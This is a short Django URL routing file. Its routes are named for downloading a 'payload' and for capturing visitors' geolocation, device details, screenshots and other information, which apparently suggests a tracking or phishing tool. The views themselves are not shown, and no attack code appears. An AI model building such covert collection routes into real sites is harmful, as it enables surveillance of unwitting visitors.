from django.urls import path
from . import views

urlpatterns = [
    path('', views.index, name='index'),
    path('download_payload/', views.download_payload),
    path('geo_capture/', views.geo_capture),
    path('upload/', views.upload_image, name='upload_image'),
    path('save-location/', views.save_location, name='save_location'),
    path('log-device/', views.save_device_info, name='log_device_info'),
    path('save-screenshot/', views.save_screenshot, name='save_screenshot'),
    path('collect-info/', views.collect_visitor_info, name='collect_info'),

]